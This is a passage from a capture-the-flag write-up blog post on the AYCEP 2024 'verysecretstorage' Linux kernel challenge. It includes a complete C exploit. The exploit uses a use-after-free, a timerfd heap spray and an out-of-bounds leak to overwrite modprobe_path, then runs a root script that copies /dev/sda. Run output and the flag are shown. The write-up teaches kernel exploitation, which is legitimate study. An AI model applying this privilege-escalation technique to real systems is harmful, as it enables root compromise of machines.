<h2 id="Step-5-Setting-note-addr-to-modprobe-path"><a href="#Step-5-Setting-note-addr-to-modprobe-path" class="headerlink" title="Step 5: Setting note_addr to modprobe_path"></a>Step 5: Setting note_addr to modprobe_path</h2><p>Finally, we are nearing the end. We now want to set <code>note_addr</code> of box 1 to <code>modprobe_path</code>, so we can override it! What is this <code>modprobe_path</code> I keep talking about? Well, in classical ring 3 exploitation, a WWW2exec is usually accomplished by a GOT override, so in kernel, we have a <code>modprobe_path</code> override! (this is the best analogy i can come up with, for more info, see <a target="_blank" rel="noopener" href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/">this</a>) We use the RESIZE call to make the note in box 0 of size 0x60, and hence including the <code>note_addr</code> of box 1. This will still overlap box 1, as we are freeing and immediately allocating from the same kmalloc-96 cache, hence the address is constant.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Changing size of note in box 0 to include note_addr of box 1...&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Overriding note_addr of box 1 to modprobe_path...&quot;</span>);</span><br><span class="line">req.idx = <span class="number">0</span>;</span><br><span class="line">req.note_size = <span class="number">0x60</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> box2[<span class="number">12</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">box2[<span class="number">10</span>] = <span class="number">0x100</span>;</span><br><span class="line">box2[<span class="number">11</span>] = mpp;</span><br><span class="line">req.note_addr = box2;</span><br><span class="line">ioctl(fd, RESIZE, &amp;req);</span><br></pre></td></tr></table></figure>

<h2 id="Step-6-Win-flag"><a href="#Step-6-Win-flag" class="headerlink" title="Step 6: Win flag"></a>Step 6: Win flag</h2><p>Now all we have to do is write to <code>modprobe_path</code>, and we can get the flag!</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Overriding modprobe_path...&quot;</span>);</span><br><span class="line"><span class="type">char</span> binsh[] = <span class="string">&quot;/tmp/x&quot;</span>;</span><br><span class="line">req.idx = <span class="number">1</span>;</span><br><span class="line">req.note_addr = binsh;</span><br><span class="line"></span><br><span class="line">ioctl(fd, WRITE, &amp;req);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;modprobe_path overridden!&quot;</span>);</span><br><span class="line">get_flag();</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Setting up for fake modprobe...&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Running unknown file...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/dummy 2&gt;/dev/null&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Here is flag!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /tmp/flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Within the kernel, when we run a file of an unknown type, this code is called:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">  	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">  	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">  	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">  	argv[<span class="number">3</span>] = module_name;</span><br><span class="line">  	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Note how we make a call to the global <code>modprobe_path</code> variable, running as root. So all we have to do is put our own script at <code>modprobe_path</code> to give us the flag!</p>
<h2 id="Step-7-Running-the-exploit"><a href="#Step-7-Running-the-exploit" class="headerlink" title="Step 7: Running the exploit"></a>Step 7: Running the exploit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Setting CPU affinity...</span><br><span class="line">Creating 2 boxes...</span><br><span class="line">Deleting box 1...</span><br><span class="line">Spraying timerfd_ctx objects in kmalloc-256...</span><br><span class="line">Inserting new note in box 1, kmalloc-256...</span><br><span class="line">Sprayed objects! Waiting for objects to populate...</span><br><span class="line">Allocating note of size 0x58 in box 0 to fit in kmalloc-96...</span><br><span class="line">Box 0&#x27;s note now contains pointer to box 1! Box 1 note_size faked to 0x200, ready for OOB read</span><br><span class="line">Leaking modprobe_path address...</span><br><span class="line">Leaked modprobe_path address: 0xffffffff8c33f100</span><br><span class="line">Changing size of note in box 0 to include note_addr of box 1...</span><br><span class="line">Overriding note_addr of box 1 to modprobe_path...</span><br><span class="line">Overriding modprobe_path...</span><br><span class="line">modprobe_path overridden!</span><br><span class="line">Setting up for fake modprobe...</span><br><span class="line">Running unknown file...</span><br><span class="line">Here is flag!</span><br><span class="line">AYCEP&#123;m0Dp70B3_P47H_t0_R0P_LLC_53C73T_sT074g3&#125;</span><br></pre></td></tr></table></figure>
<p>Final code:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_PATH <span class="string">&quot;/dev/secretstorage&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CREATE  0xc020ca00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ    0xc020ca01</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE   0xc020ca02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RESIZE  0xc020ca03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE  0xc020ca04</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">req</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> idx;</span><br><span class="line">    <span class="type">uint64_t</span> name_addr;</span><br><span class="line">    <span class="type">uint64_t</span> note_size;</span><br><span class="line">    <span class="type">uint64_t</span> note_addr;</span><br><span class="line">&#125; REQ;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MPPBASE 0x1b3f100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">box</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>];</span><br><span class="line">    <span class="type">uint64_t</span> note_size; </span><br><span class="line">    <span class="type">uint64_t</span> note_addr;</span><br><span class="line">&#125; BOX; <span class="comment">// 0x60 - kmalloc-96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ull unsigned long long</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Setting up for fake modprobe...&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Running unknown file...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/dummy 2&gt;/dev/null&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Here is flag!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /tmp/flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Setting CPU affinity...&quot;</span>);</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu;</span><br><span class="line">    CPU_ZERO(&amp;cpu);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu);</span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">cpu_set_t</span>), &amp;cpu)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Creating 2 boxes...&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd = open(DEVICE_PATH, O_WRONLY);</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ull leaks[<span class="number">0x600</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    REQ req;</span><br><span class="line">    req.note_size = <span class="number">0x100</span>;</span><br><span class="line">    req.name_addr = name;</span><br><span class="line">    req.note_addr = leaks;</span><br><span class="line">    </span><br><span class="line">    ioctl(fd, CREATE, &amp;req);</span><br><span class="line">    ioctl(fd, CREATE, &amp;req);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Deleting box 1...&quot;</span>);</span><br><span class="line">    req.idx = <span class="number">1</span>;</span><br><span class="line">    ioctl(fd, DELETE, &amp;req);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Spraying timerfd_ctx objects in kmalloc-256...&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> timer_fds[<span class="number">500</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">itimerspec</span> <span class="title">its</span>;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">500</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">250</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Inserting new note in box 1, kmalloc-256...&quot;</span>);</span><br><span class="line">            ioctl(fd, RESIZE, &amp;req);</span><br><span class="line">        &#125;</span><br><span class="line">        timer_fds[i] = timerfd_create(CLOCK_REALTIME, <span class="number">0</span>);</span><br><span class="line">        its.it_value.tv_sec = <span class="number">1</span>;</span><br><span class="line">        its.it_value.tv_nsec = <span class="number">0</span>;</span><br><span class="line">        its.it_interval.tv_sec = <span class="number">1</span>;</span><br><span class="line">        its.it_interval.tv_nsec = <span class="number">0</span>;</span><br><span class="line">        timerfd_settime(timer_fds[i], <span class="number">0</span>, &amp;its, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sprayed objects! Waiting for objects to populate...&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating note of size 0x58 in box 0 to fit in kmalloc-96...&quot;</span>);</span><br><span class="line">    req.idx = <span class="number">0</span>;</span><br><span class="line">    req.note_size = <span class="number">0x58</span>;</span><br><span class="line">    ull box[<span class="number">12</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    box[<span class="number">10</span>] = <span class="number">0x200</span>;</span><br><span class="line">    req.note_addr = box;</span><br><span class="line">    ioctl(fd, RESIZE, &amp;req);</span><br><span class="line">    <span class="comment">//item0&#x27;s note now has item1</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Box 0&#x27;s note now contains pointer to box 1! Box 1 note_size faked to 0x200, ready for OOB read&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Leaking modprobe_path address...&quot;</span>);</span><br><span class="line">    req.idx = <span class="number">1</span>;</span><br><span class="line">    req.note_addr = leaks;</span><br><span class="line">    ioctl(fd, READ, &amp;req);</span><br><span class="line">    ull mpp = leaks[<span class="number">37</span>] + <span class="number">0x1839180</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Leaked modprobe_path address: %p\n&quot;</span>, mpp);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Changing size of note in box 0 to include note_addr of box 1...&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Overriding note_addr of box 1 to modprobe_path...&quot;</span>);</span><br><span class="line">    req.idx = <span class="number">0</span>;</span><br><span class="line">    req.note_size = <span class="number">0x60</span>;</span><br><span class="line">    ull box2[<span class="number">12</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    box2[<span class="number">10</span>] = <span class="number">0x100</span>;</span><br><span class="line">    box2[<span class="number">11</span>] = mpp;</span><br><span class="line">    req.note_addr = box2;</span><br><span class="line">    ioctl(fd, RESIZE, &amp;req);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Overriding modprobe_path...&quot;</span>);</span><br><span class="line">    <span class="type">char</span> binsh[] = <span class="string">&quot;/tmp/x&quot;</span>;</span><br><span class="line">    req.idx = <span class="number">1</span>;</span><br><span class="line">    req.note_addr = binsh;</span><br><span class="line">    </span><br><span class="line">    ioctl(fd, WRITE, &amp;req);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modprobe_path overridden!&quot;</span>);</span><br><span class="line">    get_flag();</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Overall, I really enjoyed this challenge, special thanks once again to Kaligula for writing this! Overall was a great introduction to the kernel heap and its various objects, while not being too difficult as to be unsolvable for a first-timer.</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Data-structures"><span class="toc-number">2.1.</span> <span class="toc-text">Data structures</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#box"><span class="toc-number">2.1.1.</span> <span class="toc-text">box</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DO-CREATE"><span class="toc-number">2.2.</span> <span class="toc-text">DO_CREATE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DO-READ"><span class="toc-number">2.3.</span> <span class="toc-text">DO_READ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DO-WRITE"><span class="toc-number">2.4.</span> <span class="toc-text">DO_WRITE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DO-RESIZE"><span class="toc-number">2.5.</span> <span class="toc-text">DO_RESIZE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DO-DELETE"><span class="toc-number">2.6.</span> <span class="toc-text">DO_DELETE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-0-Setup"><span class="toc-number">3.</span> <span class="toc-text">Step 0: Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-1-UAF"><span class="toc-number">4.</span> <span class="toc-text">Step 1: UAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-2-Heap-spraying-with-timerfd-ctx"><span class="toc-number">5.</span> <span class="toc-text">Step 2: Heap spraying with timerfd_ctx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-3-Modifying-note-size-with-UAF"><span class="toc-number">6.</span> <span class="toc-text">Step 3: Modifying note_size with UAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-4-Leaking-modprobe-path-address"><span class="toc-number">7.</span> <span class="toc-text">Step 4: Leaking modprobe_path address</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-5-Setting-note-addr-to-modprobe-path"><span class="toc-number">8.</span> <span class="toc-text">Step 5: Setting note_addr to modprobe_path</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-6-Win-flag"><span class="toc-number">9.</span> <span class="toc-text">Step 6: Win flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-7-Running-the-exploit"><span class="toc-number">10.</span> <span class="toc-text">Step 7: Running the exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">11.</span> <span class="toc-text">Conclusion</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://fern89.github.io/2024/12/19/verysecretstorage/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://fern89.github.io/2024/12/19/verysecretstorage/&text=AYCEP 2024 - verysecretstorage"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://fern89.github.io/2024/12/19/verysecretstorage/&title=AYCEP 2024 - verysecretstorage"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://fern89.github.io/2024/12/19/verysecretstorage/&is_video=false&description=AYCEP 2024 - verysecretstorage"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AYCEP 2024 - verysecretstorage&body=Check out this article: https://fern89.github.io/2024/12/19/verysecretstorage/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://fern89.github.io/2024/12/19/verysecretstorage/&title=AYCEP 2024 - verysecretstorage"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://fern89.github.io/2024/12/19/verysecretstorage/&title=AYCEP 2024 - verysecretstorage"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://fern89.github.io/2024/12/19/verysecretstorage/&title=AYCEP 2024 - verysecretstorage"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://fern89.github.io/2024/12/19/verysecretstorage/&title=AYCEP 2024 - verysecretstorage"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://fern89.github.io/2024/12/19/verysecretstorage/&name=AYCEP 2024 - verysecretstorage&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://fern89.github.io/2024/12/19/verysecretstorage/&t=AYCEP 2024 - verysecretstorage"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    fern
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "e2c0a56b5d4d466baf300058fd41c3e8"}'></script>

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
